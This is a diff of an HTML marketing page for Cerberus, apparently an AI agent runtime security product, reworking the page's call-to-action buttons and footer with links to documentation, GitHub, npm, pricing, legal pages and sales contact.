+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><polygon points="5,3 19,12 5,21"/></svg>
+      Try Live Demo
+    </a>
+    <a href="pricing.html" class="btn btn-blue btn-pill">Get Enterprise License &#8594;</a>
+    <a href="https://github.com/Odingard/cerberus" target="_blank" class="btn btn-outline btn-pill">Star on GitHub</a>
   </div>
-  <div class="footer-links" style="margin-top:0.5rem;font-size:0.75rem">
-    <a href="https://github.com/Odingard/cerberus/blob/main/docs/getting-started.md">Docs</a>
-    <a href="https://github.com/Odingard/cerberus/blob/main/docs/api.md">API</a>
-    <a href="https://github.com/Odingard/cerberus/blob/main/legal/PRIVACY.md">Privacy</a>
-    <a href="https://github.com/Odingard/cerberus/blob/main/legal/EULA.md">Terms</a>
-    <a href="https://github.com/Odingard/cerberus/blob/main/legal/SLA.md">SLA</a>
-    <a href="https://github.com/Odingard/cerberus/blob/main/SECURITY.md">Security</a>
+</div>
+
+<!-- ── Footer ─────────────────────────────────────────────────────────────── -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-top">
+      <div>
+        <div class="footer-brand-name">CERBERUS<span>.</span></div>
+        <div class="footer-tagline">Agentic AI Runtime Security Platform<br>by Odingard Security</div>
+        <div class="footer-company">&#169; 2017&ndash;2026 Six Sense Enterprise Services LLC</div>
+      </div>
+      <div>
+        <div class="footer-col-title">Product</div>
+        <ul class="footer-links">
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/docs/getting-started.md" target="_blank">Documentation</a></li>
+          <li><a href="https://github.com/Odingard/cerberus" target="_blank">GitHub</a></li>
+          <li><a href="https://www.npmjs.com/package/@cerberus-ai/core" target="_blank">npm Package</a></li>
+          <li><a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank">Live Demo</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/docs/api.md" target="_blank">API Reference</a></li>
+        </ul>
+      </div>
+      <div>
+        <div class="footer-col-title">Enterprise</div>
+        <ul class="footer-links">
+          <li><a href="pricing.html">Pricing</a></li>
+          <li><a href="mailto:enterprise@sixsenseenterprise.com">Contact Sales</a></li>
+          <li><a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank">Request Demo</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/legal/SLA.md" target="_blank">SLA</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/legal/EULA.md" target="_blank">EULA</a></li>
+        </ul>
+      </div>
+      <div>
+        <div class="footer-col-title">Company</div>
+        <ul class="footer-links">
+          <li><a href="https://www.sixsenseenterprise.com" target="_blank">Odingard Security</a></li>
+          <li><a href="https://www.sixsenseenterprise.com" target="_blank">sixsenseenterprise.com</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/SECURITY.md" target="_blank">Security Policy</a></li>
+        </ul>
+      </div>
+      <div>
+        <div class="footer-col-title">Legal</div>
+        <ul class="footer-links">
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/LICENSE" target="_blank">MIT License</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/legal/EULA.md" target="_blank">EULA</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/legal/PRIVACY.md" target="_blank">Privacy Policy</a></li>
+          <li><a href="https://github.com/Odingard/cerberus/blob/main/legal/SLA.md" target="_blank">SLA Terms</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <div class="footer-copy">&#169; 2017&ndash;2026 Six Sense Enterprise Services LLC. All rights reserved.</div>
+      <div class="footer-legal">
+        <a href="https://github.com/Odingard/cerberus/blob/main/legal/PRIVACY.md" target="_blank">Privacy</a>
+        <a href="https://github.com/Odingard/cerberus/blob/main/legal/EULA.md" target="_blank">Terms</a>
+        <a href="https://github.com/Odingard/cerberus/blob/main/SECURITY.md" target="_blank">Security</a>
+        <a href="mailto:enterprise@sixsenseenterprise.com">Contact</a>
+      </div>
+    </div>
   </div>
-  <p style="margin-top:0.75rem;font-size:0.7rem;color:var(--muted)">&copy; 2017-2026 Six Sense Enterprise Services LLC. All rights reserved.</p>
 </footer>
 
 </body>
